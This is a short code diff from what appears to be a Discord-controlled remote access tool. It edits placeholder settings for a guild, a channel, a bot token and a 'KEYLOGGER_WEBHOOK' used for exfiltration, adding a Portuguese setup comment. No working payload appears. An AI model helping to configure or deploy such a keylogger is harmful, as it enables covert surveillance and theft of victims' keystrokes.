@@ -37,7 +37,7 @@ from libraries import layn
 
 
 GUILD = discord.Object(id = "ID GRUPO")
-CHANNEL = ID CANAL
+CHANNEL = "ID CANAL" # tire as aspas e coloque o id do canal
 KEYLOGGER_WEBHOOK = "WEBHOOK DISCORD"
 CURRENT_AGENT = 0
 BOT_TOKEN = "TOKEN BOT"
